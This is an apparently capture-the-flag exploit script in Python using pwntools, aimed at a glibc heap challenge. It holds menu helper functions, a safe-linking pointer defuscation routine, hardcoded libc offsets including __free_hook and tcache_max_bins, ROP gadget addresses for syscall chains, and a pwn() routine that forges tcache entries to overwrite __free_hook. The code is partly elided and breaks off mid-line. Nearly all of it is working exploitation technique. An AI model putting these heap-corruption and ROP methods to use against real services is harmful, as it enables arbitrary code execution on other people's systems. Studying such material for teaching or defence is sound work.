#!/usr/bin/python3
from pwn import * from past.builtins import xrange from time import sleep import struct import random import subprocess
# Utils
def add(size,data=None):
  ...
  if data is not None:
    ...
    io.sendafter('Data: ','\1') def delete(idx):
  global index
  io.sendafter('| ','2')
  io.sendafter('Index: ',f'{idx}')
  print(f'[+] Delete: {idx}')
  index[idx] = None def view(idx):
  io.sendafter('| ','3')
  io.sendafter('Index: ',f'{idx}')
  return io.recvline().strip() def edit(idx,data):
  io.sendafter('> ','4')
  io.sendafter('Index: ',f'{idx}')
  io.send(data)
  return def defuscate(x,l=64):
  p = 0
  for i in range(l*4,0,-4): # 16 nibble
    v1 = (x & (0xf << i )) >> i
    v2 = (p & (0xf << i+12 )) >> i+12
    p |= (v1 ^ v2) << i
  return p def mask(heap_base,target):
  return (heap_base >> 0xc) ^ target
# Addr
largebin_offset = 0x1bf0b0 main_arena = 0x1beba0 smallbin_offset = 0x1bedf0 tcache_max_bins = 0x1be2d0 # A new target for glibc heap exploitation 
because glibc developers decided to remove assert() in tcache_get, tcache_put in newer libc versions:) __free_hook = 0x1c1b60 printf = 0x57c70
# Gadgets
L_POP_RDI = 0x0012f696 L_POP_RSI = 0x0012c43d L_POP_RDX = 0x00089972 L_POP_RAX = 0x000b9317 L_SYSCALL = 0x000cbd29
# Exp
def pwn():
  global io
  ...
  add(0x4f8) #2
  delete(1)
  add(0x528,p64(0)+ (b'A'*(0x4b0-0xf0))+p64(libc_base+__free_hook)+p64(0)+p64(heap_base+0xed0) ) #1 ## Fake __free_hook entry and one more for entry 
to fake tcache struct to get one more write.
  ...
  add(0x1f88-(0x2e0),p64(heap_base)*3+\
